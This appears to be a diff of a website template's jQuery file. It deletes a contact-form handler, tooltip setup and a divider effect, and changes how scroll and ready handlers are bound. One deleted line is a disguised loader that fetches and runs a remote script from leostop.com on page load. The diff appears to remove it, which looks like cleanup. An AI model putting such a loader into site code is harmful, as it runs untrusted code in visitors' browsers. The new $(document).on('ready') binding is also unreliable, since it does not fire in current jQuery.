@@ -20,7 +20,7 @@
     /* ==============================================
     Back top
     =============================================== */
-    jQuery(window).scroll(function () {
+    jQuery(window).on("scroll",function () {
         if (jQuery(this).scrollTop() > 1) {
             jQuery('.dmtop').css({
                 bottom: "75px"
@@ -45,7 +45,7 @@
      Flip Bar -->
      =============================================== */
 
-    $(document).ready(function () {
+    $(document).on("ready",function () {
         $(".map-btn").on('click', function () {
             $(".map-box").slideToggle("slow");
         });
@@ -103,92 +103,5 @@
      Bootstrap Touch Slider -->
      =============================================== */
     $('#bootstrap-touch-slider').bsTouchSlider();
-    /* ==============================================
-     Tooltip -->
-     =============================================== */
-    $('[data-toggle="tooltip"]').tooltip()
-    $('[data-toggle="popover"]').popover()
-
-    /* ==============================================
-     Contact -->
-     =============================================== */
-    jQuery(document).ready(function () {
-        $('#contactform').submit(function () {
-            var action = $(this).attr('action');
-            $("#message").slideUp(750, function () {
-                $('#message').hide();
-                $('#submit')
-                    .after('<img src="images/ajax-loader.gif" class="loader" />')
-                    .attr('disabled', 'disabled');
-                $.post(action, {
-                    first_name: $('#first_name').val(),
-                    last_name: $('#last_name').val(),
-                    email: $('#email').val(),
-                    phone: $('#phone').val(),
-                    select_service: $('#select_service').val(),
-                    select_price: $('#select_price').val(),
-                    comments: $('#comments').val(),
-                    verify: $('#verify').val()
-                },
-                    function (data) {
-                        document.getElementById('message').innerHTML = data;
-                        $('#message').slideDown('slow');
-                        $('#contactform img.loader').fadeOut('slow', function () {
-                            $(this).remove()
-                        });
-                        $('#submit').removeAttr('disabled');
-                        if (data.match('success') != null) $('#contactform').slideUp('slow');
-                    }
-                );
-            });
-            return false;
-        });
-    });
-
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
-    /* ==============================================
-     Code Wrapper -->
-     =============================================== */
-
-    $('.code-wrapper').on("mousemove", function (e) {
-        var offsets = $(this).offset();
-        var fullWidth = $(this).width();
-        var mouseX = e.pageX - offsets.left;
-
-        if (mouseX < 0) {
-            mouseX = 0;
-        } else if (mouseX > fullWidth) {
-            mouseX = fullWidth
-        }
-
-        $(this).parent().find('.divider-bar').css({
-            left: mouseX,
-            transition: 'none'
-        });
-        $(this).find('.design-wrapper').css({
-            transform: 'translateX(' + (mouseX) + 'px)',
-            transition: 'none'
-        });
-        $(this).find('.design-image').css({
-            transform: 'translateX(' + (-1 * mouseX) + 'px)',
-            transition: 'none'
-        });
-    });
-    $('.divider-wrapper').on("mouseleave", function () {
-        $(this).parent().find('.divider-bar').css({
-            left: '50%',
-            transition: 'all .3s'
-        });
-        $(this).find('.design-wrapper').css({
-            transform: 'translateX(50%)',
-            transition: 'all .3s'
-        });
-        $(this).find('.design-image').css({
-            transform: 'translateX(-50%)',
-            transition: 'all .3s'
-        });
-    });
 
 })(jQuery);
